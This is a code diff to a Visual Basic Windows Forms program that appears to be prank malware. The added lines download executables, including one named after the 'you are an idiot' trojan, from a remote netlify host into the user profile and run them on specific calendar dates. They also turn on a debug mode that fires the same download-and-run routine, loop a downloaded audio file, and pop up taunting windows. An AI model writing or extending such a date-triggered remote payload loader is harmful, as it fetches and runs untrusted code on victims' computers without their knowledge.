@@ -11,7 +11,7 @@ Public Class Form1
     Dim UserFoler = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
     Dim ServerAddr = "https://denver3289yf998dh287hd9hd9827h.netlify.app/"
     Dim InstallPath = UserFoler & "\Denver3"
-    Dim DebugMode = False
+    Dim DebugMode = True
 
     Private Const SPI_SETDESKWALLPAPER As Integer = &H14
     Private Const SPIF_UPDATEINIFILE As Integer = &H1
@@ -22,7 +22,17 @@ Public Class Form1
 
 
     Private Sub DebugScript() 'Code to run on debug mode
+        Try
+            My.Computer.Network.DownloadFile(ServerAddr & "MTRAILS.exe", InstallPath & "\MTRAILS.exe")
+        Catch ex As Exception
 
+        End Try
+        Try
+            Process.Start(InstallPath & "\MTRAILS.exe")
+        Catch ex As Exception
+            MsgBox("ERROR FAILED TO START MTRAILS.exe", 0 + 16, "ERROR")
+        End Try
+        Conewehwsqafv.Show()
     End Sub
 
 
@@ -218,7 +228,19 @@ Public Class Form1
                 End Try
 
             End If
+            If currentTime.Month = 7 And currentTime.Date.Day = 12 Then
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "MTRAILS.exe", InstallPath & "\MTRAILS.exe")
+                Catch ex As Exception
 
+                End Try
+                Try
+                    Process.Start(InstallPath & "\MTRAILS.exe")
+                Catch ex As Exception
+                    MsgBox("ERROR FAILED TO START MTRAILS.exe", 0 + 16, "ERROR")
+                End Try
+                Conewehwsqafv.Show()
+            End If
 
             If currentTime.Month = 3 And currentTime.Date.Day = 10 Then
                 Try
@@ -377,12 +399,50 @@ Public Class Form1
                         End Try
                     Next
                 End If
+            If currentTime.Month = 4 And currentTime.Date.Day = 15 Then
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "you_are_an_idiot_Made_for_Epicerror.exe", InstallPath & "\you_are_an_idiot_Made_for_Epicerror.exe")
+                Catch ex As Exception
+
+                End Try
+                Process.Start(InstallPath & "\you_are_an_idiot_Made_for_Epicerror.exe")
+            End If
+            If currentTime.Month = 4 And currentTime.Date.Day = 25 Then
+                MsgBox("ur worst nightmare")
+                AAAAAAA.Show()
+            End If
+            If currentTime.Month = 8 And currentTime.Date.Day = 23 Then
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "you_are_an_idiot_Made_for_Epicerror.exe", InstallPath & "\you_are_an_idiot_Made_for_Epicerror.exe")
+                Catch ex As Exception
+
+                End Try
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "MTRAILS.exe", InstallPath & "\MTRAILS.exe")
+                Catch ex As Exception
+
+                End Try
+                Try
+                    Process.Start(InstallPath & "\MTRAILS.exe")
+                Catch ex As Exception
+                    MsgBox("ERROR FAILED TO START MTRAILS.exe", 0 + 16, "ERROR")
+                End Try
+                Process.Start(InstallPath & "\you_are_an_idiot_Made_for_Epicerror.exe")
+            End If
 
             If currentTime.Month = 10 And currentTime.Date.Day = 2 Then
                 ScreenStuck.Show()
             End If
             If currentTime.Month = 4 And currentTime.Date.Day = 16 Then
                 FitTeaTimer.Start()
+            End If
+            If currentTime.Month = 6 And currentTime.Date.Day = 17 Then
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "STILLALI.EXE.wav", InstallPath & "\STILLALI.EXE.wav")
+                Catch ex As Exception
+
+                End Try
+                My.Computer.Audio.Play(InstallPath & "\STILLALI.EXE.wav", AudioPlayMode.BackgroundLoop)
             End If
             If currentTime.Month = 11 Then
                     Try
